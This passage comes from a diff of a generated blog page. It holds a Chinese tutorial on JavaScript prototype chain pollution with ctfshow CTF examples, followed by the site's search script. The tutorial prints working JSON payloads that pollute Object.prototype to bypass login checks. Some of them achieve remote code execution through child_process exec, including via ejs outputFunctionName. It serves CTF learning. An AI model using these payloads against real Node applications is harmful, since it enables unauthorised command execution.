this.bar=this.bar+1 } } (new Foo()).show() //输出1 //但是每次新建一个foo对象，this.show就会执行一次，show方法是绑定在对象上的，而不是绑定在类上 //使用原型prototype创建类时，就会只创建一次show方法。 function Foo() { this.bar = 1 } Foo.prototype.show = function show() { console.log(this.bar) } let foo = new Foo() foo.show() //输出1 //原型prototype是类Foo的一个属性，所有实例化的对象，都有这个熟悉的内容。 //foo对象天生就有show方法 //通过proto属性可以访问类的原型，即： foo.__proto__==Foo.prototype 总结： prototype是一个类的属性，所有类对象实例化时都会有prototype中的属性和方法\njs中的继承 linkjs中的继承使用的便是prototype\nfunction Father() { this.first_name = 'Donald' this.last_name = 'Trump' } function Son() { this.first_name = 'Melania' } Son.prototype = new Father() let son = new Son() console.log(`Name: ${son.first_name} ${son.last_name}`) //输出：Name: Melania Trump //此过程为：在son中找last_name，如果找不到就在son.__proto__找，如果还找不到，就在son.__proto__.__proto__里找，依次寻找直到null结束，如Object.prototype的__proto__就是null 原型链污染 link原理 link可以访问原型，也可以修改原型的值\nlet foo = {bar: 1} // foo.bar 此时为1 console.log(foo.bar) // 修改foo的原型（即Object） foo.__proto__.bar = 2 // 由于查找顺序的原因，foo.bar仍然是1 console.log(foo.bar) // 此时再用Object创建一个空的zoo对象 let zoo = {} // 查看zoo.bar console.log(zoo.bar) //尽管zoo为空对象，依然输出了1 1 2 //foo.__proto__实际上是一个Object类的实例，所以其实是给这个类新增了一个bar属性。所以新建的zoo继承Object，自然也有bar属性 使用场景 link找到能控制的数组（对象）的键名的操作即可\n对象merge 对象clone function merge(target, source) { for (let key in source) { if (key in source \u0026\u0026 key in target) { merge(target[key], source[key]) } else { target[key] = source[key] } } } 存在target[key] = source[key]，如果key为__proto__呢\nlet o1 = {} let o2 = {a: 1, \"__proto__\": {b: 2}} merge(o1, o2) console.log(o1.a, o1.b) // 输出1 2 o3 = {} console.log(o3.b) //输出空 合并成功了，但是原型链没有被污染。 因为创建o2的过程let o2 = {a: 1, \"__proto__\": {b: 2}}中，__proto__\"已经代表o2的原型了，遍历键名，得到的是a，b，而不是a,__proto__，也就无法修改原型\nlet o1 = {} let o2 = JSON.parse('{\"a\": 1, \"__proto__\": {\"b\": 2}}') merge(o1, o2) console.log(o1.a, o1.b) o3 = {} console.log(o3.b) //输出1 2 2，原型链被污染 因为在json解析下，__proto__是一个真正的键名，而不代表原型，后面遍历o2时也能正常获取键名。\n例题： link1 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var secert = {}; var sess = req.session; let user = {}; utils.copy(user,req.body); if(secert.ctfshow==='36dboy'){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'+JSON.stringify(user)}); } }); 因为存在utils.copy函数\nfunction copy(object1, object2){ for (let key in object2) { if (key in object2 \u0026\u0026 key in object1) { copy(object1[key], object2[key]) } else { object1[key] = object2[key] } } } 所以有原型链污染 传入payload：\n{ \"username\": \"a\", \"__proto__\": { \"ctfshow\": \"36dboy\" } } 2 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); res.render('api', { query: Function(query)(query)}); }); 因为所有变量的最顶层是object，所以若当前上下文不存在query，会自动向上查找object的query属性，故可以进行原型链污染\n{\"username\":\"admin\",\"password\":\"admin\",\"__proto__\":{\"query\":\"return global.process.mainModule.constructor._load('child_process').exec('id')\"}} 3 link router.post('/', require('body-parser').json(),function(req, res, next) { res.type('html'); var flag='flag_here'; var user = new function(){ this.userinfo = new function(){ this.isVIP = false; this.isAdmin = false; this.isAuthor = false; }; } utils.copy(user.userinfo,req.body); if(user.userinfo.isAdmin){ res.end(flag); }else{ return res.json({ret_code: 2, ret_msg: '登录失败'}); } user.__proto__不是Object，是f()。user.__proto__.__proto__才是，所以需要污染两层。\n{ \"__proto__\": { \"__proto__\": { \"query\": \"return global.process.mainModule.constructor._load('child_process').exec('id')\" } } } 4 link router.get('/', function(req, res, next) { res.type('html'); res.render('index'); }); ejs rce\n{\"__proto__\":{\"__proto__\":{\"outputFunctionName\":\"_tmp1;global.process.mainModule.require('child_process').exec('id');var __tmp2\"}}} get绕过 link router.get('/', function(req, res, next) { res.type('html'); var flag = 'flag_here'; if(req.url.match(/8c|2c|\\,/ig)){ res.end('where is flag :)'); } var query = JSON.parse(req.query.query); if(query.name==='admin'\u0026\u0026query.password==='ctfshow'\u0026\u0026query.isVIP===true){ res.end(flag); }else{ res.end('where is flag. :)'); } }); 正常传入\n{ \"name\": \"admin\", \"password\": \"ctfshow\", \"isVIP\": true } 但过滤了,和/2c，所以即便req.url不进行url解码，也无法传入逗号。 利用req.query.query的特性：传入的相同get参数会加入一个数组，然后JSON.parse会把数组内的元素拼接在一起。 也就是传入query={\"name\":\"admin\"\u0026query=\"password\":\"%63tfshow\"\u0026query=\"isVIP\":true}的话，第一步得到['{\"name\":\"admin\"','\"password\":\"ctfshow\"','\"isVIP\":true}']，第二步就是目标json。 使用%63是防止\"编码后的%22和C变为2c被过滤。\n"
+            }
+        );
+    search.addEventListener('input', show_results, true);
+
+    function show_results(){
+        const maxResult =  5 ;
+        const minlength =  0 ;
+        var searchQuery = sanitizeHTML(this.value);
+        var results = index.search(searchQuery, {limit: maxResult, enrich: true});
+
+        
+        const flatResults = new Map(); 
+        for (const result of results.flatMap(r => r.result)) {
+        if (flatResults.has(result.doc.href)) continue;
+        flatResults.set(result.doc.href, result.doc);
+        }
+
+        suggestions.innerHTML = "";
+        suggestions.classList.remove('d-none');
+
+        
+        if (searchQuery.length < minlength) {
+            const minCharMessage = document.createElement('div')
+            minCharMessage.innerHTML = `Please type at least <strong>${minlength}</strong> characters`
+            minCharMessage.classList.add("suggestion__no-results");
+            suggestions.appendChild(minCharMessage);
+            return;
+        } else {
+            
+            if (flatResults.size === 0 && searchQuery) {
+                const noResultsMessage = document.createElement('div')
+                noResultsMessage.innerHTML = "No results for" + ` "<strong>${searchQuery}</strong>"`
+                noResultsMessage.classList.add("suggestion__no-results");
+                suggestions.appendChild(noResultsMessage);
+                return;
+            }
+        }
+
+        
+        for(const [href, doc] of flatResults) {
+            const entry = document.createElement('div');
+            suggestions.appendChild(entry);
+
+            const a = document.createElement('a');
+            a.href = href;
+            entry.appendChild(a);
+
+            const title = document.createElement('span');
+            title.textContent = doc.title;
+            title.classList.add("suggestion__title");
+            a.appendChild(title);
+
+            const description = document.createElement('span');
+            description.textContent = doc.description;
+            description.classList.add("suggestion__description");
+            a.appendChild(description);
+
+            suggestions.appendChild(entry);
+
+            if(suggestions.childElementCount == maxResult) break;
+        }
+    }
+    }());
+</script>
+        
+    </body>
+</html>
